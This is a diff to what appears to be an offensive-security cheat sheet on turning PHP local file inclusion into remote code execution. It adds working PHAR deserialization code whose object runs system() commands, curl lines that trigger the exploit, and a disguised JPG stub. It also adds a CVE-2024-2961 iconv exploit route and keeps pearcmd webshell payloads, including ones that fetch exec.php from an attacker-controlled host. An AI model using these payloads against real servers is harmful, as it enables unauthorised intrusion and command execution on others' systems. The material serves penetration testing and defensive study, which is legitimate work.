@@ -26,9 +26,12 @@
     - [Wrapper input://](#wrapper-input)
     - [Wrapper zip://](#wrapper-zip)
     - [Wrapper phar://](#wrapper-phar)
+      - [PHAR archive structure](#phar-archive-structure)
+      - [PHAR deserialization](#phar-deserialization)
     - [Wrapper convert.iconv:// and dechunk://](#wrapper-converticonv-and-dechunk)
   - [LFI to RCE via /proc/*/fd](#lfi-to-rce-via-procfd)
   - [LFI to RCE via /proc/self/environ](#lfi-to-rce-via-procselfenviron)
+  - [LFI to RCE via iconv](#lfi-to-rce-via-iconv)
   - [LFI to RCE via upload](#lfi-to-rce-via-upload)
   - [LFI to RCE via upload (race)](#lfi-to-rce-via-upload-race)
   - [LFI to RCE via upload (FindFirstFile)](#lfi-to-rce-via-upload-findfirstfile)
@@ -241,36 +244,82 @@ Alternatively, Kadimus has a module to automate this attack.
 
 ### Wrapper phar://
 
-Create a phar file with a serialized object in its meta-data.
+#### PHAR archive structure
+
+PHAR files work like ZIP files, when you can use the `phar://` to access files stored inside them.
+
+1. Create a phar archive containing a backdoor file: `php --define phar.readonly=0 archive.php`
+
+  ```php
+  <?php
+    $phar = new Phar('archive.phar');
+    $phar->startBuffering();
+    $phar->addFromString('test.txt', '<?php phpinfo(); ?>');
+    $phar->setStub('<?php __HALT_COMPILER(); ?>');
+    $phar->stopBuffering();
+  ?>
+  ```
+
+2. Use the `phar://` wrapper: `curl http://127.0.0.1:8001/?page=phar:///var/www/html/archive.phar/test.txt`
+
+
+#### PHAR deserialization
+
+:warning: This technique doesn't work on PHP 8+, the deserialization has been removed. 
+
+If a file operation is now performed on our existing phar file via the `phar://` wrapper, then its serialized meta data is unserialized. This vulnerability occurs in the following functions, including file_exists: `include`, `file_get_contents`, `file_put_contents`, `copy`, `file_exists`, `is_executable`, `is_file`, `is_dir`, `is_link`, `is_writable`, `fileperms`, `fileinode`, `filesize`, `fileowner`, `filegroup`, `fileatime`, `filemtime`, `filectime`, `filetype`, `getimagesize`, `exif_read_data`, `stat`, `lstat`, `touch`, `md5_file`, etc.
+
+This exploit requires at least one class with magic methods such as `__destruct()` or `__wakeup()`.
+Let's take this `AnyClass` class as example, which execute the parameter data.
+
+```php
+class AnyClass {
+	public $data = null;
+	public function __construct($data) {
+		$this->data = $data;
+	}
+	
+	function __destruct() {
+		system($this->data);
+	}
+}
+
+...
+echo file_exists($_GET['page']);
+```
+
+We can craft a phar archive containing a serialized object in its meta-data.
 
 ```php
 // create new Phar
-$phar = new Phar('test.phar');
+$phar = new Phar('deser.phar');
 $phar->startBuffering();
 $phar->addFromString('test.txt', 'text');
-$phar->setStub('<?php __HALT_COMPILER(); ? >');
+$phar->setStub('<?php __HALT_COMPILER(); ?>');
 
 // add object of any class as meta data
-class AnyClass {}
-$object = new AnyClass;
-$object->data = 'rips';
+class AnyClass {
+	public $data = null;
+	public function __construct($data) {
+		$this->data = $data;
+	}
+	
+	function __destruct() {
+		system($this->data);
+	}
+}
+$object = new AnyClass('whoami');
 $phar->setMetadata($object);
 $phar->stopBuffering();
 ```
 
-If a file operation is now performed on our existing Phar file via the phar:// wrapper, then its serialized meta data is unserialized. If this application has a class named AnyClass and it has the magic method __destruct() or __wakeup() defined, then those methods are automatically invoked
+Finally call the phar wrapper: `curl http://127.0.0.1:8001/?page=phar:///var/www/html/deser.phar`
+
+NOTE: you can use the `$phar->setStub()` to add the magic bytes of JPG file: `\xff\xd8\xff`
 
 ```php
-class AnyClass {
-    function __destruct() {
-        echo $this->data;
-    }
-}
-// output: rips
-include('phar://test.phar');
+$phar->setStub("\xff\xd8\xff\n<?php __HALT_COMPILER(); ?>");
 ```
-
-NOTE: The unserialize is triggered for the phar:// wrapper in any file operation, `file_exists` and many more.
 
 
 ### Wrapper convert.iconv:// and dechunk://
@@ -343,6 +392,22 @@ Like a log file, send the payload in the User-Agent, it will be reflected inside
 GET vulnerable.php?filename=../../../proc/self/environ HTTP/1.1
 User-Agent: <?=phpinfo(); ?>
 ```
+
+
+## LFI to RCE via iconv
+
+Use the iconv wrapper to trigger an OOB in the glibc (CVE-2024-2961), then use your LFI to read the memory regions from `/proc/self/maps` and to download the glibc binary. Finally you get the RCE by exploiting the `zend_mm_heap` structure to call a `free()` that have been remapped to `system` using `custom_heap._free`.
+
+
+**Requirements**:
+
+* PHP 7.0.0 (2015) to 8.3.7 (2024)
+* GNU C Library (`glibc`) <=  2.39
+* Access to `convert.iconv`, `zlib.inflate`, `dechunk` filters
+
+**Exploit**:
+
+* [ambionics/cnext-exploits](https://github.com/ambionics/cnext-exploits/tree/main)
 
 
 ## LFI to RCE via upload
@@ -535,12 +600,13 @@ register_argc_argv = On
 
 There are this ways to exploit it.
 
-* Method 1: config create
+* **Method 1**: config create
   ```ps1
   /vuln.php?+config-create+/&file=/usr/local/lib/php/pearcmd.php&/<?=eval($_GET['cmd'])?>+/tmp/exec.php
   /vuln.php?file=/tmp/exec.php&cmd=phpinfo();die();
   ```
-* Method 2: man_dir
+
+* **Method 2**: man_dir
   ```ps1
   /vuln.php?file=/usr/local/lib/php/pearcmd.php&+-c+/tmp/exec.php+-d+man_dir=<?echo(system($_GET['c']));?>+-s+
   /vuln.php?file=/tmp/exec.php&c=id
@@ -551,18 +617,13 @@ There are this ways to exploit it.
   a:2:{s:10:"__channels";a:2:{s:12:"pecl.php.net";a:0:{}s:5:"__uri";a:0:{}}s:7:"man_dir";s:29:"<?echo(system($_GET['c']));?>";}
   ```
 
-* Method 3: download
-  
-  Need external network connection.
+* **Method 3**: download (need external network connection).
   ```ps1
   /vuln.php?file=/usr/local/lib/php/pearcmd.php&+download+http://<ip>:<port>/exec.php
   /vuln.php?file=exec.php&c=id
   ```
-* Method 4: install
-  
-  Need external network connection.
-  
-  Notice that `exec.php` locates at `/tmp/pear/download/exec.php`.
+
+* **Method 4**: install (need external network connection). Notice that `exec.php` locates at `/tmp/pear/download/exec.php`.
   ```ps1
   /vuln.php?file=/usr/local/lib/php/pearcmd.php&+install+http://<ip>:<port>/exec.php
   /vuln.php?file=/tmp/pear/download/exec.php&c=id
@@ -624,3 +685,5 @@ If SSH is active check which user is being used `/proc/self/status` and `/etc/pa
 * [PHP FILTER CHAINS: FILE READ FROM ERROR-BASED ORACLE - Rémi Matasse - 21/03/2023](https://www.synacktiv.com/en/publications/php-filter-chains-file-read-from-error-based-oracle.html)
 * [One Line PHP: From Genesis to Ragnarök - Ginoah, Bookgin](https://hackmd.io/@ginoah/phpInclude#/)
 * [Introducing wrapwrap: using PHP filters to wrap a file with a prefix and suffix - Charles Fol - 11 December, 2023](https://www.ambionics.io/blog/wrapwrap-php-filters-suffix)
+* [Iconv, set the charset to RCE: exploiting the libc to hack the php engine (part 1) - Charles Fol - 27 May, 2024](https://www.ambionics.io/blog/iconv-cve-2024-2961-p1)
+* [OffensiveCon24- Charles Fol- Iconv, Set the Charset to RCE - 14 juin 2024](https://youtu.be/dqKFHjcK9hM)
